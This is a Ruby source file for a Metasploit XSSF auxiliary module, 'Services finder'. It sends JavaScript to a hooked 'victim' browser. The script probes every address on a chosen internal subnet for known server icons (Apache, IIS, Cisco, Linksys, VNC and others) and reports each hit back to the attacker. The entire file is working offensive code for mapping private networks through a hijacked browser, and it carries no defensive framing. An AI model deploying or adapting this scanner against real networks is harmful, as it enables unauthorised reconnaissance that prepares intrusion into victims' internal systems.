require 'msf/core'
require 'msf/base/xssf'

#
# READ README_XSSF FILE FOR MORE INFORMATION ABOUT MODULES
#
class Metasploit3 < Msf::Auxiliary
	include Msf::Xssf::XssfServer
	
	# Module initialization
	def initialize(info = {})
		super(update_info(info,
			'Name'        => 'Services finder',
			'Description' => 'Find if there are some web services without authentication on local network !'
		))
		
		register_options(
			[
				OptPort.new('port', [true, 'Port you want to find servers', 80]),
				OptEnum.new('netmask', [true, 'Netmask of subnetwork', 24, [8,16,24]]),
				OptEnum.new('kind', [true, 'Kind of service you want to find', 'APACHE', ['APACHE', 'APACHE2', 'IIS4-5', 'IIS5-6', 'SunOne', 'Cisco', 'LinKsys', 'tightVNC', 'WebLogic', 'thttpd', 'PHP', 'HP']]),
				OptAddress.new('network', [true, 'IP adress of subnetwork', '192.168.1.0'])
			], self.class
		)
	end
	
	# Part sent to the victim, insert your code here !!!
	def on_request_uri(cli, req)

		case datastore['kind']
			when 'APACHE';		icon = '/icons/apache_pb.gif'
			when 'PHP';			icon = '/?=PHPE9568F36-D428-11d2-A769-00AA001ACF42'
			when 'APACHE2';		icon = '/icons/apache_pb2.gif'
			when 'IIS4-5';		icon = '/iis4_5.gif'	
			when 'IIS5-6';		icon = '/iis51_6.gif'
			when 'SunOne';		icon = '/sun.gif'
			when 'Cisco';		icon = '/cisco.gif'
			when 'LinKsys';		icon = '/linksys.gif'
			when 'tightVNC';	icon = '/vnc.gif'
			when 'WebLogic';	icon = '/bea.gif'
			when 'thttpd';		icon = '/thttpd.gif'	
			else;				icon = '/hp/device/hp_invent_logo.gif'
		end

		
		code = %Q{
			function ifUp(url, name) {
				var img = new Image();
				img.onload = function() { XSSF_POST(name, '#{self.name}'); } ;

				img.src = url + "?" + escape(new Date().getTime());
			}
		}
		
		
		addr_split = datastore['network'].split('.')

		case datastore['netmask']
			when 8
				code << %Q{
					for (var i = 0; i <= 255; i++)
						for (var j = 0; j <= 255; j++)
							for (var k = 0; k <= 255; k++)
								ifUp(eval("server_" + i + j + " = 'http://#{addr_split[0]}." + i + "." + j + "." + k + ":#{datastore['port']}';") + '#{icon}', eval("server_" + i + j + " = 'http://#{addr_split[0]}." + i + "." + j + "." + k + ":#{datastore['port']}';"));
				}

			when 16
				code << %Q{
					for (var i = 0; i <= 255; i++)
						for (var j = 0; j <= 255; j++)
							ifUp(eval("server_" + i + j + " = 'http://#{addr_split[0]}.#{addr_split[1]}." + i + "." + j + ":#{datastore['port']}';") + '#{icon}', eval("server_" + i + j + " = 'http://#{addr_split[0]}.#{addr_split[1]}." + i + "." + j + ":#{datastore['port']}';"));
				}

			else
				code << %Q{	
					for (var i = 0; i <= 255; i++)
						ifUp(eval("server_" + i + " = 'http://#{addr_split[0]}.#{addr_split[1]}.#{addr_split[2]}." + i + ":#{datastore['port']}';") + '#{icon}', eval("server_" + i + " = 'http://#{addr_split[0]}.#{addr_split[1]}.#{addr_split[2]}." + i + ":#{datastore['port']}';"));
				}
		end

		send_response(cli, code)
	end
end